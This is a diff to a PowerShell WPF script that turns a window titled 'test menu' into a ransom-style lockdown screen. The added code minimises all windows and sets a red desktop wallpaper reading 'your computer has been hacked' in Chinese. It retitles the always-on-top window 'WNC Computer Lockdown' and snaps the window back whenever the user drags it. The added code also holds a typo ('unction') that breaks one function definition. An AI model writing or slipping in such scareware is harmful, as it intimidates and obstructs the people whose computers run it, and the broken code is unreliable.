@@ -45,11 +45,77 @@ function Get-SystemFiles {
     return $allFiles | Select-Object -First $maxFiles
 }
 
+function Hide-AllWindows {
+    try {
+        $shell = New-Object -ComObject "Shell.Application"
+        $shell.MinimizeAll()
+    } catch {}
+}
 # Get files for display
 $systemFiles = Get-SystemFiles
 
+unction Set-RansomWallpaper {
+    $width = [System.Windows.SystemParameters]::PrimaryScreenWidth
+    $height = [System.Windows.SystemParameters]::PrimaryScreenHeight
+    
+    $bitmap = New-Object System.Drawing.Bitmap([int]$width, [int]$height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    
+    # Fill with solid red
+    $graphics.Clear([System.Drawing.Color]::FromArgb(255, 200, 0, 0))
+    
+    # Add text
+    $font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
+    $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
+    
+    $text = "您的電腦已被駭客入侵。"
+    $textSize = $graphics.MeasureString($text, $font)
+    $x = ($width - $textSize.Width) / 2
+    $y = ($height - $textSize.Height) / 2
+    
+    $graphics.DrawString($text, $font, $brush, $x, $y)
+    
+    # Save and set as wallpaper
+    $wallpaperPath = "$env:TEMP\hacked_wallpaper.bmp"
+    $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
+    
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Wallpaper {
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    }
+"@
+    
+    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 0x01 -bor 0x02)
+    
+    # Cleanup
+    $brush.Dispose()
+    $font.Dispose()
+    $graphics.Dispose()
+    $bitmap.Dispose()
+}
+
+
+# ========== EXECUTION FLOW ==========
+
+# Step 1: Hide all windows
+Hide-AllWindows
+
+# Step 2: Change background wallpaper
+Set-RansomWallpaper
+
+# Step 3: Wait 1 second
+Start-Sleep -Seconds 1
+
+# Step 4: Continue with the rest of the script (getting files and showing UI)
+# Get files for display
+$systemFiles = Get-SystemFiles
+
+
 $w = New-Object System.Windows.Window
-$w.Title = "test menu"
+$w.Title = "WNC Computer Lockdown - 你完蛋了"
 $w.Width = 1200
 $w.Height = 900
 $w.Topmost = $true
@@ -519,6 +585,30 @@ $null = $g.Children.Add($leftScroll)
 $null = $g.Children.Add($fileContainer)
 $null = $g.Children.Add($b)
 $null = $g.Children.Add($title)
+
+# --- Non-draggable lock logic for ONE window ---
+$lockReady = $false
+$lockLeft  = 0.0
+$lockTop   = 0.0
+
+# Capture final startup position (after centering/layout completes)
+$w.Add_ContentRendered({
+    $script:lockLeft  = $w.Left
+    $script:lockTop   = $w.Top
+    $script:lockReady = $true
+})
+
+# If user drags window, force it back
+$w.Add_LocationChanged({
+    if ($script:lockReady) {
+        if ($w.Left -ne $script:lockLeft -or $w.Top -ne $script:lockTop) {
+            $w.Left = $script:lockLeft
+            $w.Top  = $script:lockTop
+        }
+    }
+})
+# -----------------------------------------------
+
 
 $w.Content = $g
 
